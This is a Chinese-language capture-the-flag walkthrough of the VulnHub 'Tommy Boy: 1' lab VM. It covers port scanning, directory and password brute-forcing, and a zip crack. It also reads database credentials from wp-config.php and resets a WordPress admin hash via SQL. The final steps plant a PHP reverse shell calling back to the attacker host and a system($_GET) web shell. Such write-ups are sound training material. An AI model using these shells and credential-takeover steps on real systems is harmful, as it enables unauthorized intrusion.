# TOMMY BOY: 1

2024-7-31 https://www.vulnhub.com/entry/tommy-boy-1,157/

difficulty: begginer-intermediate

## IP

192.168.5.32

## Scan

pen Port -> 22,80,8008

```
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8008/tcp open  http
```

http://192.168.5.32/robots.txt 显示目录,逐个访问下。

```
Disallow: /6packsofb...soda
Disallow: /lukeiamyourfather
Disallow: /lookalivelowbridge
Disallow: /flag-numero-uno.txt
```

找到了第 1 个 flag: http://192.168.5.32/flag-numero-uno.txt

```
This is the first of five flags in the Callhan Auto server.  You'll need them all to unlock
the final treasure and fully consider the VM pwned!

Flag data: B34rcl4ws
```

在 80 web 页面的首页源代码中发现提示信息：

```
Seriously? You losers are hopeless. We hid it in a folder named after the place you noticed after you and Tom Jr. had your big fight. You know, where you cracked him over the head with a board. It's here if you don't remember: https://www.youtube.com/watch?v=VUxOd4CszJ8
```

提示我们访问网站 https://www.youtube.com/watch?v=VUxOd4CszJ8 发现一个名字 prehistoric forest , 使用这个单词作为路径名 http://192.168.5.32/prehistoricforest/ 发现了一个 wordpress 网站，从里面的一个评论中发现了第 2 个 flag: http://192.168.5.32/prehistoricforest/index.php/2016/07/06/announcing-the-callahan-internal-company-blog/

```
Flag #2: thisisthesecondflagyayyou.txt

继续访问 http://192.168.5.32/prehistoricforest/thisisthesecondflagyayyou.txt

You've got 2 of five flags - keep it up!

Flag data: Z4l1nsky
```

在 http://192.168.5.32/prehistoricforest/index.php/2016/07/07/son-of-a/ 发现了一个目录 http://192.168.5.32/richard/ 显示了一张图片，看看图片中是否有隐写：

```
exiftool shockedrichard.jpg
User Comment : ce154b5a8e59c89732bc25d6a2e6b90b
```

是一个哈希，尝试解密，得到 spanky 像是一个用户名或者是密码，在这里需要输入一个密码才能访问 http://192.168.5.32/prehistoricforest/index.php/2016/07/06/status-of-restoring-company-home-page/ 输入 spanky 得到了另外一个提示: 有一个备份叫 callahanbak.bak， ssh 用户 tom，ftp 每 15 分钟开启后 15 分钟关闭，然后有一个用户名 nickburns, 密码是常见密码，尝试访问这个 ftp。

这时再次用 nmap 扫描，发现了 65534 的 ftp 端口，输入用户名 nickburns , 密码尝试用与用户名相同的密码，登陆成功，发现文件 readme.txt 查看其内容，提示服务器上有一个 NickIzL33t，并且 tom 的文件存放在这个文件夹下的 zip 文件中。

尝试在 80 端口上打开 /NickIzL33t 提示 404，尝试 8008 端口上打开 /NickIzL33t 提示 403 , 根据提示发现是 UA 不对，尝试更换 UA 头，最终在 iphone 头上发现了提示: Gotta know the EXACT name of the .html to break into this fortress.

根据提示有一个 html 文件，使用 gobuster 对这个路径进行爆破，看看能否找到隐藏页面。发现页面 fallon1.html(别忘记要设置 UA 头为 iphone):

```
ffuf -c -w /usr/share/wordlists/rockyou.txt -u http://192.168.5.32:8008/NickIzL33t/FUZZ.html -fc 403 -H "User-Agent:Mozilla/5.0 (iPhone; CPU iPhone OS 9_2 like Mac OS X) AppleWebKit/601.1 (KHTML, like Gecko) CriOS/47.0.2526.70 Mobile/13C71 Safari/601.1.46"
```

发现了第 3 个 flag http://192.168.5.32:8008/NickIzL33t/flagtres.txt

```
THREE OF 5 FLAGS - you're awesome sauce.
Flag data: TinyHead
```

http://192.168.5.32:8008/NickIzL33t/hint.txt 上有一些提示信息，密码为 13 个字符，策略如下:

```
Your password is your wife's nickname "bev" (note it's all lowercase) plus the following:

* One uppercase character
* Two numbers
* Two lowercase characters
* One symbol
* The year Tommy Boy came out in theaters 1995
```

发现了 http://192.168.5.32:8008/NickIzL33t/t0msp4ssw0rdz.zip 密码压缩包,需要按照上面的规则构建密码字典才能解密 zip，使用 crunch 生成密码字典:

```
crunch 13 13 -t bev,%%@@^1995 -o pass

zip2john t0msp4ssw0rdz.zip > hash
john hash --wordlist=pass
```

找到了密码 bevH00tr$1995 解压 zip 得到密码:

```
Sandusky Banking Site
------------------------
Username: BigTommyC
Password: money

TheKnot.com (wedding site)
---------------------------
Username: TomC
Password: wedding

Callahan Auto Server
----------------------------
Username: bigtommysenior
Password: fatguyinalittlecoat

Note: after the "fatguyinalittlecoat" part there are some numbers, but I don't remember what they are.
However, I wrote myself a draft on the company blog with that information.

Callahan Company Blog
----------------------------
Username: bigtom(I think?)
Password: ???
Note: Whenever I ask Nick what the password is, he starts singing that famous Queen song.
```

尝试用这些凭据登陆 ssh，都不成功。提示中说 fatguyinalittlecoat 后面缺失的部分在博客的草稿中，估计就是这个 wordpress http://192.168.5.32/prehistoricforest/ 使用 wpscan 进行扫描
，枚举出来几个用户名，tommy、richard、tom、Tom Jr.、Big Tom、michelle 尝试是否能登陆 wp 的后台，最终发现 tom 用户能够登陆，密码为 tomtom1

得到密码中的后面数字 http://192.168.5.32/prehistoricforest/?p=22&preview=true

bigtommysenior:fatguyinalittlecoat1938!! 尝试用这个凭据进行 ssh 登陆，成功登陆。

当前目录下，el-flag-numero-quatro.txt 发现第 4 个 flag ：

```
YAY!  Flag 4 out of 5!!!! And you should now be able to restore the Callhan Web server to normal
working status.

Flag data: EditButton

But...but...where's flag 5?

I'll make it easy on you.  It's in the root of this server at /5.txt
```

```
ls -al /.5.txt
-rwxr-x--- 1 www-data www-data 520 Jul  7  2016 /.5.txt
```

需要得到 www-data 的权限才能读取 5.txt，根据 el-flag-numero-quatro 中的提示，需要我们恢复 Callhan Web server，尝试用前面得到的 wp 的权限去获得一个 webshell。

```
cd /var/www/html/prehistoricforest
cat wp-config.php

# 发现数据库密码
define('DB_USER', 'wordpressuser');
define('DB_PASSWORD', 'CaptainLimpWrist!!!');
define('DB_HOST', 'localhost');
define('DB_CHARSET', 'utf8');
define('DB_COLLATE', '');
```

进入数据库，查询 wp_user 表，得到信息：

```
mysql> select user_login, user_pass from wp_users;
+------------+------------------------------------+
| user_login | user_pass                          |
+------------+------------------------------------+
| richard    | $P$BzW7ZDwxd7THv1D4rTANjGGgzV0XK9/ |
| tom        | $P$BmXAz/a8CaPZDNTraFb/g6kZeTpijK. |
| tommy      | $P$BCcKbJIQtLuiBOybaQPkkfe1yYJRkn. |
| michelle   | $P$BIEfXY1Li5aYTokSsi7pBgh0FTlO6k/ |
+------------+------------------------------------+
```

查询 wp_usermeta 表发现 richard 是管理员，直接修改其数据库密码为 `$P$BjF1A15izEcqrYfcW.ZW6HsyAoSYnm1` 对应的明文是 tomtom1

```
UPDATE `wp_users` SET `user_pass` = '$P$BjF1A15izEcqrYfcW.ZW6HsyAoSYnm1' WHERE user_login = 'richard';
```

进入后在 Theme 中编辑 404.php 页面，植入 php webshell:

```
http://192.168.5.32/prehistoricforest/wp-admin/theme-editor.php?file=404.php&theme=twentysixteen

$sock=fsockopen("192.168.5.3",8888);popen("/bin/bash <&3 >&3 2>&3", "r");
```

访问触发反弹 curl http://192.168.5.32/prehistoricforest/wp-content/themes/twentysixteen/404.php 读取到了 /.5.txt :

```
FIFTH FLAG!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
YOU DID IT!!!!!!!!!!!!!!!!!!!!!!!!!!!!
OH RICHARD DON'T RUN AWAY FROM YOUR FEELINGS!!!!!!!!

Flag data: Buttcrack

Ok, so NOW what you do is take the flag data from each flag and blob it into one big chunk.
So for example, if flag 1 data was "hi" and flag 2 data was "there" and flag 3 data was "you"
you would create this blob:

hithereyou

Do this for ALL the flags sequentially, and this password will open the loot.zip in Big Tom's
folder and you can call the box PWNED.
```

将前面得到的 5 个 flag 拼接到一起: B34rcl4wsZ4l1nskyTinyHeadEditButtonButtcrack , 解压 loot.zip 输入此密码，得到 THE-END.txt

最后还发现了一个可以不用修改 wordpress 的登陆密码的方法，这个文件夹有写入权限:

```
/var/thatsg0nnaleaveamark/NickIzL33t/P4TCH_4D4MS$ echo '<?php system($_GET[1]);?>' > uploads/shell.php
```

写入一个 webshell 后，也可以获取到 /.5.txt 的内容。

```
http://192.168.5.32:8008/NickIzL33t/P4TCH_4D4MS/uploads/shell.php?1=cat%20/.5.txt
```
